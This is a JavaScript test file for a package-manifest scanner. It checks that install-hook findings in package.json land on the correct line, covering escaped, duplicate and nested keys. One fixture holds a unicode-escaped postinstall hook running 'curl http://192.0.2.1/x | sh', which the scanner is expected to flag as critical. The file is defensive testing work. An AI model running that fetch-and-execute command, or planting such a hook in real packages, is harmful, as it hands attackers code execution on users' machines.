// Review: SC-INSTALL-HOOK was reported at the first line naming the hook
// anywhere in package.json: a dependency called `install` on line 4 took the
// finding (and its snippet) instead of the "scripts" entry on line 7. The
// line is now that of the hook's key inside the top-level "scripts" object
// (keys compared decoded; the last duplicate, which the parser keeps, wins),
// as core.scan_manifest does. Inert content.

import { test } from "node:test";
import assert from "node:assert/strict";
import { scanManifest } from "../src/index.js";

const DEPENDENCY = '{\n  "name": "x",\n  "dependencies": {\n    "install": "^1.0.0"\n  },\n'
  + '  "scripts": {\n    "install": "node-gyp rebuild"\n  }\n}\n';
const TRICKY = '{"description": "run \\"postinstall\\" first", "scripts": {"test": "x"},\n'
  + '"config": {"scripts": {"postinstall": "no"}},\n'
  + '"scripts": {\n"post\\u0069nstall": "curl http://192.0.2.1/x | sh",\n "prepare": "a",\n'
  + '"prepare": "husky install"}, "x": [{"install": 1}]}\n';
const hooks = (issues) => issues.filter((i) => i.rule === "SC-INSTALL-HOOK").map((i) => [i.line, i.sev, i.cmd]);

test("a dependency named like the hook does not take the finding", () => {
  const [issue] = scanManifest("package.json", DEPENDENCY);
  assert.deepEqual([issue.line, issue.sev], [7, "MAJOR"]);                    // was 4
  assert.equal(issue.snippet[issue.line - issue.snipStart], '    "install": "node-gyp rebuild"');
  assert.deepEqual(hooks(scanManifest("package.json", DEPENDENCY, { registry: true })), [[7, "MAJOR", "node-gyp rebuild"]]);
});

test("escaped, duplicate and nested keys; one-line and BOM manifests", () => {
  assert.deepEqual(hooks(scanManifest("package.json", TRICKY)),
    [[4, "CRITICAL", "curl http://192.0.2.1/x | sh"], [6, "INFO", "husky install"]]);
  const oneLine = JSON.stringify({ install: 1, scripts: { preinstall: "node a.js", install: "node b.js" } });
  assert.deepEqual(scanManifest("package.json", oneLine).map((i) => i.line), [1, 1]);
  assert.deepEqual(hooks(scanManifest("package.json", "\ufeff" + DEPENDENCY)), [[7, "MAJOR", "node-gyp rebuild"]]);
  assert.deepEqual(hooks(scanManifest("package.json", '{"scripts": [1], "scripts": {\n"install": "a"}}')), [[2, "MAJOR", "a"]]);
});
